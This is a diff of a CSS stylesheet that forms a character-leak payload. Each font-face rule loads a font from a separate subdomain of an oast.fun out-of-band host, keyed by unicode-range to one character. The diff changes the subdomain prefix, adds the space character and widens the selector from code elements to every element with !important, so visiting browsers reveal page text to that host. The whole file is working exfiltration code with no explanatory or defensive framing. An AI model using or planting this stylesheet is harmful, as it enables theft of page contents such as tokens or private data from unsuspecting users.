@@ -1,449 +1,454 @@
 @font-face {
   font-family: 'f41';
-  src: url('http://fc-41.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-41.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0041;
 }
 @font-face {
   font-family: 'f42';
-  src: url('http://fc-42.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-42.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0042;
 }
 @font-face {
   font-family: 'f43';
-  src: url('http://fc-43.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-43.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0043;
 }
 @font-face {
   font-family: 'f44';
-  src: url('http://fc-44.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-44.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0044;
 }
 @font-face {
   font-family: 'f45';
-  src: url('http://fc-45.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-45.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0045;
 }
 @font-face {
   font-family: 'f46';
-  src: url('http://fc-46.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-46.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0046;
 }
 @font-face {
   font-family: 'f47';
-  src: url('http://fc-47.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-47.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0047;
 }
 @font-face {
   font-family: 'f48';
-  src: url('http://fc-48.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-48.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0048;
 }
 @font-face {
   font-family: 'f49';
-  src: url('http://fc-49.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-49.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0049;
 }
 @font-face {
   font-family: 'f4a';
-  src: url('http://fc-4a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-4a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+004a;
 }
 @font-face {
   font-family: 'f4b';
-  src: url('http://fc-4b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-4b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+004b;
 }
 @font-face {
   font-family: 'f4c';
-  src: url('http://fc-4c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-4c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+004c;
 }
 @font-face {
   font-family: 'f4d';
-  src: url('http://fc-4d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-4d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+004d;
 }
 @font-face {
   font-family: 'f4e';
-  src: url('http://fc-4e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-4e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+004e;
 }
 @font-face {
   font-family: 'f4f';
-  src: url('http://fc-4f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-4f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+004f;
 }
 @font-face {
   font-family: 'f50';
-  src: url('http://fc-50.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-50.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0050;
 }
 @font-face {
   font-family: 'f51';
-  src: url('http://fc-51.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-51.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0051;
 }
 @font-face {
   font-family: 'f52';
-  src: url('http://fc-52.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-52.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0052;
 }
 @font-face {
   font-family: 'f53';
-  src: url('http://fc-53.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-53.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0053;
 }
 @font-face {
   font-family: 'f54';
-  src: url('http://fc-54.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-54.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0054;
 }
 @font-face {
   font-family: 'f55';
-  src: url('http://fc-55.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-55.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0055;
 }
 @font-face {
   font-family: 'f56';
-  src: url('http://fc-56.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-56.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0056;
 }
 @font-face {
   font-family: 'f57';
-  src: url('http://fc-57.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-57.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0057;
 }
 @font-face {
   font-family: 'f58';
-  src: url('http://fc-58.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-58.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0058;
 }
 @font-face {
   font-family: 'f59';
-  src: url('http://fc-59.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-59.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0059;
 }
 @font-face {
   font-family: 'f5a';
-  src: url('http://fc-5a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-5a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+005a;
 }
 @font-face {
   font-family: 'f61';
-  src: url('http://fc-61.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-61.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0061;
 }
 @font-face {
   font-family: 'f62';
-  src: url('http://fc-62.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-62.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0062;
 }
 @font-face {
   font-family: 'f63';
-  src: url('http://fc-63.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-63.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0063;
 }
 @font-face {
   font-family: 'f64';
-  src: url('http://fc-64.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-64.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0064;
 }
 @font-face {
   font-family: 'f65';
-  src: url('http://fc-65.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-65.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0065;
 }
 @font-face {
   font-family: 'f66';
-  src: url('http://fc-66.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-66.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0066;
 }
 @font-face {
   font-family: 'f67';
-  src: url('http://fc-67.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-67.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0067;
 }
 @font-face {
   font-family: 'f68';
-  src: url('http://fc-68.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-68.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0068;
 }
 @font-face {
   font-family: 'f69';
-  src: url('http://fc-69.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-69.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0069;
 }
 @font-face {
   font-family: 'f6a';
-  src: url('http://fc-6a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-6a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+006a;
 }
 @font-face {
   font-family: 'f6b';
-  src: url('http://fc-6b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-6b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+006b;
 }
 @font-face {
   font-family: 'f6c';
-  src: url('http://fc-6c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-6c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+006c;
 }
 @font-face {
   font-family: 'f6d';
-  src: url('http://fc-6d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-6d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+006d;
 }
 @font-face {
   font-family: 'f6e';
-  src: url('http://fc-6e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-6e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+006e;
 }
 @font-face {
   font-family: 'f6f';
-  src: url('http://fc-6f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-6f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+006f;
 }
 @font-face {
   font-family: 'f70';
-  src: url('http://fc-70.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-70.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0070;
 }
 @font-face {
   font-family: 'f71';
-  src: url('http://fc-71.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-71.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0071;
 }
 @font-face {
   font-family: 'f72';
-  src: url('http://fc-72.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-72.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0072;
 }
 @font-face {
   font-family: 'f73';
-  src: url('http://fc-73.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-73.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0073;
 }
 @font-face {
   font-family: 'f74';
-  src: url('http://fc-74.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-74.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0074;
 }
 @font-face {
   font-family: 'f75';
-  src: url('http://fc-75.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-75.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0075;
 }
 @font-face {
   font-family: 'f76';
-  src: url('http://fc-76.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-76.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0076;
 }
 @font-face {
   font-family: 'f77';
-  src: url('http://fc-77.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-77.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0077;
 }
 @font-face {
   font-family: 'f78';
-  src: url('http://fc-78.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-78.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0078;
 }
 @font-face {
   font-family: 'f79';
-  src: url('http://fc-79.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-79.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0079;
 }
 @font-face {
   font-family: 'f7a';
-  src: url('http://fc-7a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-7a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+007a;
 }
 @font-face {
   font-family: 'f30';
-  src: url('http://fc-30.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-30.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0030;
 }
 @font-face {
   font-family: 'f31';
-  src: url('http://fc-31.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-31.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0031;
 }
 @font-face {
   font-family: 'f32';
-  src: url('http://fc-32.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-32.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0032;
 }
 @font-face {
   font-family: 'f33';
-  src: url('http://fc-33.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-33.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0033;
 }
 @font-face {
   font-family: 'f34';
-  src: url('http://fc-34.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-34.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0034;
 }
 @font-face {
   font-family: 'f35';
-  src: url('http://fc-35.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-35.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0035;
 }
 @font-face {
   font-family: 'f36';
-  src: url('http://fc-36.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-36.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0036;
 }
 @font-face {
   font-family: 'f37';
-  src: url('http://fc-37.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-37.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0037;
 }
 @font-face {
   font-family: 'f38';
-  src: url('http://fc-38.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-38.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0038;
 }
 @font-face {
   font-family: 'f39';
-  src: url('http://fc-39.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-39.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0039;
 }
 @font-face {
   font-family: 'f7b';
-  src: url('http://fc-7b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-7b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+007b;
 }
 @font-face {
   font-family: 'f7d';
-  src: url('http://fc-7d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-7d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+007d;
 }
 @font-face {
   font-family: 'f5f';
-  src: url('http://fc-5f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-5f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+005f;
 }
 @font-face {
   font-family: 'f2d';
-  src: url('http://fc-2d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-2d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+002d;
 }
 @font-face {
   font-family: 'f21';
-  src: url('http://fc-21.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-21.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0021;
 }
 @font-face {
   font-family: 'f40';
-  src: url('http://fc-40.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-40.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0040;
 }
 @font-face {
   font-family: 'f23';
-  src: url('http://fc-23.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-23.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0023;
 }
 @font-face {
   font-family: 'f24';
-  src: url('http://fc-24.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-24.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0024;
 }
 @font-face {
   font-family: 'f25';
-  src: url('http://fc-25.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-25.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0025;
 }
 @font-face {
   font-family: 'f5e';
-  src: url('http://fc-5e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-5e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+005e;
 }
 @font-face {
   font-family: 'f26';
-  src: url('http://fc-26.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-26.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0026;
 }
 @font-face {
   font-family: 'f2a';
-  src: url('http://fc-2a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-2a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+002a;
 }
 @font-face {
   font-family: 'f28';
-  src: url('http://fc-28.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-28.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0028;
 }
 @font-face {
   font-family: 'f29';
-  src: url('http://fc-29.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-29.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+0029;
 }
 @font-face {
   font-family: 'f2b';
-  src: url('http://fc-2b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-2b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+002b;
 }
 @font-face {
   font-family: 'f3d';
-  src: url('http://fc-3d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-3d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+003d;
 }
 @font-face {
   font-family: 'f5b';
-  src: url('http://fc-5b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-5b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+005b;
 }
 @font-face {
   font-family: 'f5d';
-  src: url('http://fc-5d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-5d.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+005d;
 }
 @font-face {
   font-family: 'f7c';
-  src: url('http://fc-7c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-7c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+007c;
 }
 @font-face {
   font-family: 'f3b';
-  src: url('http://fc-3b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-3b.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+003b;
 }
 @font-face {
   font-family: 'f3a';
-  src: url('http://fc-3a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-3a.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+003a;
 }
 @font-face {
   font-family: 'f2c';
-  src: url('http://fc-2c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-2c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+002c;
 }
 @font-face {
   font-family: 'f2e';
-  src: url('http://fc-2e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-2e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+002e;
 }
 @font-face {
   font-family: 'f3c';
-  src: url('http://fc-3c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-3c.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+003c;
 }
 @font-face {
   font-family: 'f3e';
-  src: url('http://fc-3e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-3e.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+003e;
 }
 @font-face {
   font-family: 'f3f';
-  src: url('http://fc-3f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-3f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+003f;
 }
 @font-face {
   font-family: 'f2f';
-  src: url('http://fc-2f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  src: url('http://fa-2f.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
   unicode-range: U+002f;
 }
+@font-face {
+  font-family: 'f20';
+  src: url('http://fa-20.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/');
+  unicode-range: U+0020;
+}
 
-code {
-  font-family: 'f41', 'f42', 'f43', 'f44', 'f45', 'f46', 'f47', 'f48', 'f49', 'f4a', 'f4b', 'f4c', 'f4d', 'f4e', 'f4f', 'f50', 'f51', 'f52', 'f53', 'f54', 'f55', 'f56', 'f57', 'f58', 'f59', 'f5a', 'f61', 'f62', 'f63', 'f64', 'f65', 'f66', 'f67', 'f68', 'f69', 'f6a', 'f6b', 'f6c', 'f6d', 'f6e', 'f6f', 'f70', 'f71', 'f72', 'f73', 'f74', 'f75', 'f76', 'f77', 'f78', 'f79', 'f7a', 'f30', 'f31', 'f32', 'f33', 'f34', 'f35', 'f36', 'f37', 'f38', 'f39', 'f7b', 'f7d', 'f5f', 'f2d', 'f21', 'f40', 'f23', 'f24', 'f25', 'f5e', 'f26', 'f2a', 'f28', 'f29', 'f2b', 'f3d', 'f5b', 'f5d', 'f7c', 'f3b', 'f3a', 'f2c', 'f2e', 'f3c', 'f3e', 'f3f', 'f2f', monospace;
+* {
+  font-family: 'f41', 'f42', 'f43', 'f44', 'f45', 'f46', 'f47', 'f48', 'f49', 'f4a', 'f4b', 'f4c', 'f4d', 'f4e', 'f4f', 'f50', 'f51', 'f52', 'f53', 'f54', 'f55', 'f56', 'f57', 'f58', 'f59', 'f5a', 'f61', 'f62', 'f63', 'f64', 'f65', 'f66', 'f67', 'f68', 'f69', 'f6a', 'f6b', 'f6c', 'f6d', 'f6e', 'f6f', 'f70', 'f71', 'f72', 'f73', 'f74', 'f75', 'f76', 'f77', 'f78', 'f79', 'f7a', 'f30', 'f31', 'f32', 'f33', 'f34', 'f35', 'f36', 'f37', 'f38', 'f39', 'f7b', 'f7d', 'f5f', 'f2d', 'f21', 'f40', 'f23', 'f24', 'f25', 'f5e', 'f26', 'f2a', 'f28', 'f29', 'f2b', 'f3d', 'f5b', 'f5d', 'f7c', 'f3b', 'f3a', 'f2c', 'f2e', 'f3c', 'f3e', 'f3f', 'f2f', 'f20', sans-serif !important;
 }
